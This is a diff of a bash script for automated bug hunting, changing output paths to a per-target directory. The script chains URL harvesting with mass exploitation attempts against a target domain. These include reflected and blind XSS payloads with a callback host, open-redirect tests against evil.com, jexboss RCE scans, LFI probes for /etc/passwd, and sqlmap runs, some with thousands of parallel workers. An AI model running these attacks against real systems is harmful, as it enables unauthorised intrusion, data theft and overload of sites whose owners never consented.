@@ -55,30 +55,30 @@ gospider -S $1 -t 200 -c 700 | tr " " "\n" | grep --color=auto -v ".js" | grep -
 
 echo -e "WAYBACK \n"
 
-sigurlfind3r -d $1 -iS -s -f ".(jpg|jpeg|gif|png|ico|css|eot|tif|tiff|ttf|woff|woff2)" | anew -q way_output
+sigurlfind3r -d $1 -iS -s -f ".(jpg|jpeg|gif|png|ico|css|eot|tif|tiff|ttf|woff|woff2)" | anew -q $1/way_output
 #------------------------------------------------#
 echo -e "REMOVE DUB \n"
 
-cat way_output.txt | urldedupe -s | anew -q parameters.txt
+cat way_output.txt | urldedupe -s | anew -q $1/parameters.txt
 
 echo -e "handle it \n"
 rm way_output
 #------------------------------------------------#
 echo -e "REFLECTED XSS \n"
 #------------------------------------------------#
-cat parameters.txt | gf xss | sed "s/'/ /g" | sed "s/(/ /g" | sed "s/)/ /g" | qsreplace "FUZZ" | anew -q xssPatterns.txt
+cat $1/parameters.txt | gf xss | sed "s/'/ /g" | sed "s/(/ /g" | sed "s/)/ /g" | qsreplace "FUZZ" | anew -q $1/xssPatterns.txt
 #------------------------------------------------#
-cat xssPatterns.txt | qsreplace "\"><img src=x onerror=confirm(document.domain)>" | xargs -P 5000 -I % bash -c "curl -s -L '%' | grep \"<img src=x onerror=confirm(document.domain)>\" && echo -e \"[VULNERABLE] - % \n \"" 2> /dev/null | grep "VULNERABLE" | anew -q xss.txt &> /dev/null
+cat $1/xssPatterns.txt | qsreplace "\"><img src=x onerror=confirm(document.domain)>" | xargs -P 5000 -I % bash -c "curl -s -L '%' | grep \"<img src=x onerror=confirm(document.domain)>\" && echo -e \"[VULNERABLE] - % \n \"" 2> /dev/null | grep "VULNERABLE" | anew -q $1/xss.txt &> /dev/null
 #------------------------------------------------#
-dalfox file xssPatterns.txt pipe --silence --no-color --no-spinner --mass --mass-worker 5000 --skip-bav -w 1000 -b saad.xss.ht 2> /dev/null | anew -q xss.txt &> /dev/null
+dalfox file $1/xssPatterns.txt pipe --silence --no-color --no-spinner --mass --mass-worker 5000 --skip-bav -w 1000 -b saad.xss.ht 2> /dev/null | anew -q $1/xss.txt &> /dev/null
 
 echo -e "BLINDER \n"
 
-python3 Blinder.py -u saad -f parameters.txt -r deny
+python3 Blinder.py -u saad -f $1/parameters.txt -r deny
 
 echo -e "handle it \n"
 
-rm xssPatterns.txt
+rm $1/xssPatterns.txt
 
 echo -e "\e[31m
 █▀█ █▀█ █▀▀ █▄░█
@@ -88,41 +88,41 @@ coded by @ELSFA7-110@automotion bughunting@\n\e[0m"
 #------------------------------------------------#
 echo -e "OPEN REDIRECT \n"
 #------------------------------------------------#
-cat parameters.txt | gf redirect | sed "s/'/ /g" | sed "s/(/ /g" | sed "s/)/ /g" | anew -q redirectPatterns.txt
+cat $1/parameters.txt | gf redirect | sed "s/'/ /g" | sed "s/(/ /g" | sed "s/)/ /g" | anew -q $1/redirectPatterns.txt
 #------------------------------------------------#
-cat redirectPatterns.txt | qsreplace "FUZZ" | anew -q checkRedirect.txt
+cat $1/redirectPatterns.txt | qsreplace "FUZZ" | anew -q $1/checkRedirect.txt
 #------------------------------------------------#
-python3 ~/tools/OpenRedireX/openredirex.py -l checkRedirect.txt --keyword FUZZ -p ~/tools/OpenRedireX/payloads.txt 2> /dev/null | grep "^http" | sed -r -i "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" | anew -q redirect.txt &> /dev/null
+python3 OpenRedireX/openredirex.py -l $1/checkRedirect.txt --keyword FUZZ -p OpenRedireX/payloads.txt 2> /dev/null | grep "^http" | sed -r -i "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" | anew -q $1/redirect.txt &> /dev/null
 
-cat checkRedirect.txt | grep -a -i "\=http" | qsreplace "http://www.evil.com/" | xargs -P 50 -I % bash -c "curl -s -L '%' -I | grep \"evil.com\" && echo -e \"[VULNERABLE] - % \n \"" 2> /dev/null | grep "VULNERABLE" | anew -q redirect.txt &> /dev/null
+cat $1/checkRedirect.txt | grep -a -i "\=http" | qsreplace "http://www.evil.com/" | xargs -P 50 -I % bash -c "curl -s -L '%' -I | grep \"evil.com\" && echo -e \"[VULNERABLE] - % \n \"" 2> /dev/null | grep "VULNERABLE" | anew -q $1/redirect.txt &> /dev/null
 
-python3 Oralyzer/oralyzer.py -l checkRedirect.txt -p Oralyzer/payloads.txt
+python3 Oralyzer/oralyzer.py -l $1/checkRedirect.txt -p Oralyzer/payloads.txt
 
 echo -e "handle it \n"
 
-rm redirectPatterns.txt checkRedirect.txt
+rm $1/redirectPatterns.txt $1/checkRedirect.txt
 
 echo -e "RCE \n"
 
-python3 jexboss/jexboss.py -mode file-scan -file $1-alive-subs.txt -out report_file_scan.log
+python3 jexboss/jexboss.py -mode file-scan -file $1-alive-subs.txt
 
 echo -e "LFI \n"
 
-cat parameters.txt | gf lfi | sed "s/'/ /g" | sed "s/(/ /g" | sed "s/)/ /g" | anew -q lfiPatterns.txt
+cat $1/parameters.txt | gf lfi | sed "s/'/ /g" | sed "s/(/ /g" | sed "s/)/ /g" | anew -q $1/lfiPatterns.txt
 
-cat lfiPatterns.txt | xargs -P 100 -I % bash -c "curl -s -L '%' | grep \"root:\" && echo -e \"[VULNERABLE] - % \n \"" 2> /dev/null | grep "VULNERABLE" | anew -q lfi.txt &> /dev/null
+cat $1/lfiPatterns.txt | xargs -P 100 -I % bash -c "curl -s -L '%' | grep \"root:\" && echo -e \"[VULNERABLE] - % \n \"" 2> /dev/null | grep "VULNERABLE" | anew -q $1/lfi.txt &> /dev/null
 
-httpx -l lfiPatterns.txt -paths lfi-payloads.txt -threads 1000 -random-agent -x GET,POST,PUT -tech-detect -status-code -follow-redirects -title -mc 200 -match-regex "root:[x*]:0:0:"
+httpx -l $1/lfiPatterns.txt -paths lfi-payloads.txt -threads 1000 -random-agent -x GET,POST,PUT -tech-detect -status-code -follow-redirects -title -mc 200 -match-regex "root:[x*]:0:0:"
 
 echo -e "handle it \n"
 
-rm lfiPatterns.txt
+rm $1/lfiPatterns.txt
 
 echo -e "SQLI \n"
 
-cat parameters.txt | gf sqli | sed "s/'/ /g" | sed "s/(/ /g" | sed "s/)/ /g" | anew -q sqliPatterns.txt
+cat $1/parameters.txt | gf sqli | sed "s/'/ /g" | sed "s/(/ /g" | sed "s/)/ /g" | anew -q $1/sqliPatterns.txt
 
-sqlmap -m sqliPatterns.txt --batch --random-agent --level 1 --threads=5
+sqlmap -m $1/sqliPatterns.txt --batch --random-agent --level 1 --threads=5
 
 sqlmap -m $1-alive-subs.txt --batch --random-agent --level 1 --crawl=5 --forms --threads=5
 
